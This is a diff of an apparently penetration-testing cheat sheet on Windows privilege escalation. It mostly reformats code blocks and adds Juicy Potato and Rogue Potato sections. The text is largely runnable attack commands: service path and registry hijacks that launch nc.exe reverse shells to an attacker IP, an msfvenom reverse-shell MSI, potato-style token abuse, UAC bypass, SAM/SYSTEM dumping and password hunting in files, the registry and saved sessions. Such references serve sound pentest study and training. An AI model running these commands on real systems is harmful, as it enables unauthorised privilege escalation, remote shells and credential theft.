@@ -16,9 +16,13 @@ https://atom.hackstreetboys.ph/windows-privilege-escalation-service-exploits/
 
 ### Tools
 
-`powershell.exe -ex bypass -c Import-Module .\powerup.ps1; Invoke-AllChecks`
+```powershell
+powershell.exe -ex bypass -c Import-Module .\powerup.ps1; Invoke-AllChecks
+```
 
-`winPEAS.exe cmd fast`
+```powershell
+winPEAS.exe cmd fast
+```
 
 ---
 
@@ -29,13 +33,13 @@ _It is very often in Windows environments to discover services that run with SYS
 - Upload _accesschk.exe_ to a writable directory first. For XP SP0, version 5.2 of _accesschk.exe_ is needed.
 - You can execute the command as follows to list potentially vulnerable services. This will show list each service and the groups which have write permissions to that service. if you have an account in any of these groups then you’ve potentially got privilege escalation.
 
-```pwsh
+```powershell
 accesschk.exe -uwcqv * -accepteula
 ```
 
 - You could instead supply a group/user and it will limit output to services that group/user has write permission to.
 
-```pwsh
+```powershell
 accesschk.exe "Users" -uwcqv * -accepteula
 accesschk.exe "NT AUTHORITY\INTERACTIVE" -uwcqv * -accepteula
 accesschk.exe "Everyone" -uwcqv * -accepteula
@@ -44,28 +48,27 @@ accesschk.exe "Everyone" -uwcqv * -accepteula
 - The output will be the service name, the group name and the permissions that group has. Anything like _SERVICE_CHANGE_CONFIG_ or _SERVICE_ALL_ACCESS_ is a win.
 - The next step is to determine the status of this service and the binary path name.
 
-```pwsh
+```powershell
 sc qc "Service Name"
 ```
 
 - Case-a) Add the user to the admin group.
 
-```pwsh
+```powershell
 sc config "Service Name" binPath="net localgroup administrators <username> /add"
 ```
 
 - Case-b) Upload nc.exe to writable directory and change the config of service
 
-```pwsh
+```powershell
 sc config "Service Name" binpath= "C:\Inetpub\nc.exe -nv <attackerip> <attacker port> -e C:\WINDOWS\System32\cmd.exe"
 sc config "Service Name" obj= ".\LocalSystem" password= ""
 ```
 
 - Restart Service
 
-```pwsh
-sc stop "Service Name"
-sc start "Service Name"
+```powershell
+net stop [service name] && net start [service name]
 ```
 
 ---
@@ -76,13 +79,13 @@ Here we are looking for executable files associace with a service that we can ov
 
 - Find the files where we have write permission
 
-```pwsh
+```powershell
 accesschk.exe -wusv "user" "C:\Program Files" | findstr /E /C:".exe"
 ```
 
 - Find out the service name
 
-```pwsh
+```powershell
 wmic service name,pathname | findstr <name_service.exe>
 ```
 
@@ -96,20 +99,24 @@ _Here we are looking for tasks that are run by a privileged user, and run a bina
 
 - List all the tasks
 
-```pwsh
+```powershell
 schtasks /query /fo LIST /v
+```
+
+```powershell
+Get-ScheduledTask | where {$_.Principal.UserID -eq "SYSTEM" -and $_.TaskPath -notlike "\Microsoft*"} | Select-Object TaskName, @{Name="FilePath";Expression={$_.Actions[0].Execute}}
 ```
 
 - Copy-paste the text and past it into file on Kali _schtask.txt_
 - Search the task with privilege. You can change the name SYSTEM to another privileged user.
 
-```pwsh
+```powershell
 cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
 ```
 
 - Launching a Scheduled Task manually using _schtasks_.
 
-```pwsh
+```powershell
 schtasks /RUN /TN "Task Name"
 ```
 
@@ -119,7 +126,7 @@ schtasks /RUN /TN "Task Name"
 
 - Find writable registry keys for services using Accesschk.
 
-```pwsh
+```powershell
 accesschk.exe "NT AUTHORITY\INTERACTIVE" -kvuqsw hklm\System\CurrentControlSet\services -accepteula
 accesschk64.exe "BUILTIN\Users" -kqswvu hklm\System\CurrentControlSet\services -accepteula
 accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accepteula
@@ -127,7 +134,7 @@ accesschk64.exe "Everyone" -kqswvu hklm\System\CurrentControlSet\services -accep
 
 - Hunt the kyes with Linux
 
-```pwsh
+```powershell
 Get-Acl -Path hklm:\System\CurrentControlSet\services\* | Format-List | Out-File -FilePath C:\temp\service_keys.txt
 ```
 
@@ -139,23 +146,23 @@ cat service_keys.txt | grep -i "Path\|Access\|BUILTIN\\\Users\|Everyone\|INTERAC
 
 - Check query value.
 
-```pwsh
+```powershell
 reg query HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath
 ```
 
 - Change image path.
 
-```pwsh
+```powershell
 reg add HKLM\SYSTEM\CURRENTCONTROLSET\Services\SomeSoftwareName /v ImagePath /d "C:\temp\evil.exe"
 ```
 
-```pwsh
+```powershell
 Set-ItemProperty -Path "hklm:\System\CurrentControlSet\services\SomeSoftwareName" -Name "ImagePath" -Value "C:\temp\evil.exe"
 ```
 
 - Restart the service and the custom payload will be executed instead of the service binary and it will return back a shell as SYSTEM.
 
-```pwsh
+```powershell
 sc start "SomeSoftwareName"
 ```
 
@@ -167,13 +174,13 @@ In Windows environments when an application or a service is starting it looks fo
 
 - Find missing DLL
 
-```pwsh
+```powershell
 powershell.exe -ep bypass -c Import-Module .\powerup.ps1; Find-PathDLLHijack
 ```
 
 - Check if you have frite permission in the directory
 
-```pwsh
+```powershell
 icacls <path dll>
 ```
 
@@ -188,7 +195,7 @@ _AlwaysInstallElevated is functionality that offers all users (especially the lo
 
 - Check if these 2 registry value is 1.
 
-```pwsh
+```powershell
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
@@ -201,7 +208,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f msi-noua
 
 - Execute your file on victim.
 
-```pwsh
+```powershell
 msiexec /quiet /qn /i C:\evil.msi
 ```
 
@@ -213,20 +220,20 @@ _If we find a service running as SYSTEM/Administrator with an unquoted path and 
 
 - For example, the following path would be vulnerable:
 
-```pwsh
+```powershell
 C:\Program Files\canon\IJ Scan Utility\SETEVENT.exe
 ```
 
 - We could place our payload with any of the following paths:\*
 
-```pwsh
+```powershell
 C:\Program.exe
 C:\Program Files\canon\IJ.exe
 ```
 
 - The following command will display affected services:
 
-```pwsh
+```powershell
 wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
 ```
 
@@ -238,7 +245,7 @@ _NBNS spoofing + NTLM relay + implementation of a fake WPAD proxy server which i
 
 - Command to add user to admin group:
 
-```pwsh
+```powershell
 powershell.exe -ep bypass -c Import-Module ./Tater.ps1; Invoke-Tater -Trigger 1 -Command "net localgroup administrators <user name> /add"
 ```
 
@@ -248,13 +255,13 @@ powershell.exe -ep bypass -c Import-Module ./Tater.ps1; Invoke-Tater -Trigger 1 
 
 _When you have SeImpersonate or SeAssignPrimaryToken privileges_
 
-```pwsh
+```powershell
 juicypotato.exe -l 1337 -p c:\user\tmp\shell.exe -t *
 ```
 
 ---
 
-```pwsh
+```powershell
 tanter.exe <user name>
 ```
 
@@ -262,11 +269,11 @@ tanter.exe <user name>
 
 ### UAC Bypass
 
-```pwsh
+```powershell
 akagi32 <Key> <executable file>
 ```
 
-```pwsh
+```powershell
 akagi32 10 c:\windows\system32\reverse_shell.exe
 ```
 
@@ -274,19 +281,13 @@ akagi32 10 c:\windows\system32\reverse_shell.exe
 
 ### Saved session information (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
 
-```pwsh
-powershell.exe -ep bypass -c Import-Module SessionGopher.ps1; Invoke-SessionGopher -Thorough
+```powershell
+powershell.exe -ep bypass -c Import-Module SessionGopher.ps1;Invoke-SessionGopher -Thorough
 ```
 
-```pwsh
+```powershell
 SessionGopher.exe
 ```
-
----
-
-### Exploit user privileges
-
-https://github.com/gtworek/Priv2Admin
 
 ---
 
@@ -294,7 +295,7 @@ https://github.com/gtworek/Priv2Admin
 
 - Find all passwords in all files
 
-```pwsh
+```powershell
 findstr /si password *.txt
 findstr /si password *.xml
 findstr /si password *.ini
@@ -303,17 +304,17 @@ findstr /spin "password" *.*
 
 - Credentials in cmdkey
 
-```pwsh
+```powershell
 cmdkey /list
 ```
 
 - Find passwords in event log files.
 
-```pwsh
+```powershell
 C:\Windows\System32\Config\*.evt
 ```
 
-```pwsh
+```powershell
 C:\Windows\System32\winevt\Logs\*.evtx
 ```
 
@@ -323,7 +324,7 @@ Get-WinEvent -path file.evtx
 
 - SAM and SYTEM file
 
-```pwsh
+```powershell
 reg save HKLM\SAM C:\sam
 reg save HKLM\SYSTEM C:\system
 
@@ -337,7 +338,7 @@ C:\Windows\System32\config\RegBack\system
 
 - These are common files to find them in. They might be base64-encoded. So look out for that
 
-```pwsh
+```powershell
 type c:\sysprep.inf
 type c:\sysprep\sysprep.xml
 type c:\unattend.xml
@@ -347,7 +348,7 @@ type %WINDIR%\Panther\Unattended.xml
 
 - In Registry
 
-```pwsh
+```powershell
 # VNC
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 
@@ -369,9 +370,11 @@ reg query HKCU /f password /t REG_SZ /s
 
 ### Escalate to SYSTEM from Administrator
 
-```pwsh
+```powershell
 psexec -i -s cmd.exe /accepteula
 ```
+
+---
 
 ### Kernel exploit
 
@@ -384,9 +387,66 @@ python windows-exploit-suggester.py --systeminfo <filename>
 
 - Already compiled exploit
 
-```pwsh
+```powershell
 https://github.com/SecWiki/windows-kernel-exploits
 https://github.com/abatchy17/WindowsExploits
 ```
 
 ---
+
+### Juicy Potato (Abusing the golden privileges)
+
+> If the machine is **>= Windows 10 1809 & Windows Server 2019** - Try **Rogue Potato**  
+> If the machine is **< Windows 10 1809 < Windows Server 2019** - Try **Juicy Potato**
+
+- Binary available at : https://github.com/ohpe/juicy-potato/releases
+
+1. Check the privileges of the service account, you should look for **SeImpersonate** and/or **SeAssignPrimaryToken** (Impersonate a client after authentication)
+
+   ```powershell
+   whoami /priv
+   ```
+
+2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object
+
+   - [Windows 7 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise)
+   - [Windows 8.1 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise)
+   - [Windows 10 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise)
+   - [Windows 10 Professional](https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro)
+   - [Windows Server 2008 R2 Enterprise](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise)
+   - [Windows Server 2012 Datacenter](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter)
+   - [Windows Server 2016 Standard](https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard)
+
+3. Execute JuicyPotato to run a privileged command.
+
+   ```powershell
+   JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.exe" -t t -c {B91D5831-B1BD-4608-8198-D72E155020F7}
+   JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+   JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
+       Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
+       ......
+       [+] authresult 0
+       {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
+       [+] CreateProcessWithTokenW OK
+   ```
+
+---
+
+### Rogue Potato (Fake OXID Resolver)
+
+- Binary available at https://github.com/antonioCoco/RoguePotato
+
+```powershell
+# Network redirector / port forwarder to run on your remote machine, must use port 135 as src port
+socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999
+
+# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine.
+# Use this if you have fw restrictions.
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
+
+# RoguePotato all in one with RogueOxidResolver running locally on port 9999
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999
+
+#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename
+RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}" -p splintercode
+```
